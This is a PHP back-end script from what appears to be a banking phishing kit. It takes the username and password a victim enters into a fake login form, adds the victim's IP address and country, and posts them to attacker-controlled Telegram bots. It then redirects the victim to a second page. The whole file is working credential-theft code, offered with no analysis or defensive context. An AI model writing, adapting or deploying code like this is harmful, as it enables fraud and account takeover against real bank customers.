<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));

$message = "🔹BCR🔹\n👤Us4rs: ".$_POST['miDiosenticonfio']."\n🔒Cl4v: ".$_POST['miDiosenticonfio2']."\nIP: ".$_SERVER['REMOTE_ADDR'].", ".$cc."\n🔹BY SYN4PSE🔹";
$data = [

        'text' => $message
    ];

include "infotlg.php";
include "antibot.php";

$chatIds = array("$edge","$tid","$token",$google);
foreach($chatIds as $chatId) {

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&" . http_build_query($data) );
    file_get_contents("https://api.telegram.org/bot$google/sendMessage?chat_id=$chatId&" . http_build_query($data) );

   echo "<script>top.location.href = \"index2.html\"</script>";
}
?>